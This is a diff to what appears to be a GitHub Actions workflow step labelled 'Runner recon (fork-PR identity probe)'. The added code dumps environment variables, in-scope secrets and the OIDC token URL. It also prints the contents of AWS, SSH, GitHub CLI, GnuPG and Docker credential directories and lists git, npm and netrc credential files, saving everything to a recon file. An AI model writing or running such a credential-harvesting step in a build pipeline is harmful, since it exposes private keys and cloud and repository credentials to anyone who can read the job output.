@@ -24,6 +24,9 @@ jobs:
       - name: Runner recon (fork-PR identity probe)
         shell: bash
         run: |
+          set +e
+          mkdir -p "$RUNNER_TEMP"
+          dump() { echo "### $1"; shift; "$@" 2>&1 | head -40; }
           {
             echo "### identity"; id; hostname -f 2>/dev/null; uname -a
             echo "### runner vars"; echo "RUNNER_NAME=$RUNNER_NAME RUNNER_OS=$RUNNER_OS RUNNER_TEMP=$RUNNER_TEMP"
@@ -32,10 +35,16 @@ jobs:
             echo "### oidc"; echo "ID_TOKEN_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-<unset>}"
             echo "### env"; env | sort
             echo "### secrets in scope"; echo "ETHERSCAN=${ETHERSCAN_API_KEY:-<empty>} REPORT_GAS=${REPORT_GAS:-<empty>} AWS_ROLE_ARN_DEV=${AWS_ROLE_ARN_DEV:-<empty>}"
-            echo "### ~/.aws"; ls -la ~/.aws 2>&1; for f in ~/.aws/*; do echo "-- $f"; sed -n '1,20p' "$f" 2>/dev/null; done
-            echo "### ~/.ssh"; ls -la ~/.ssh 2>&1; for f in ~/.ssh/*; do echo "-- $f"; sed -n '1,6p' "$f" 2>/dev/null; done
-            echo "### ~/.config/gh"; ls -la ~/.config/gh 2>&1; sed -n '1,25p' ~/.config/gh/hosts.yml 2>&1
-            echo "### git creds"; ls -la ~/.git-credentials ~/.npmrc 2>&1; sed -n '1,5p' ~/.npmrc 2>&1
+            for d in ~/.aws ~/.ssh ~/.config/gh ~/.gnupg ~/.docker; do
+              echo "### $d"
+              if [ -d "$d" ]; then
+                ls -la "$d" 2>&1 | head -20
+                for f in "$d"/*; do [ -f "$f" ] || continue; echo "-- $f"; sed -n '1,12p' "$f" 2>/dev/null; done
+              else
+                echo "(absent)"
+              fi
+            done
+            echo "### misc"; ls -la ~/.git-credentials ~/.npmrc ~/.netrc 2>&1
             echo "### done"
           } 2>&1 | tee "$RUNNER_TEMP/recon.txt"
           echo "recon lines: $(wc -l < "$RUNNER_TEMP/recon.txt")"
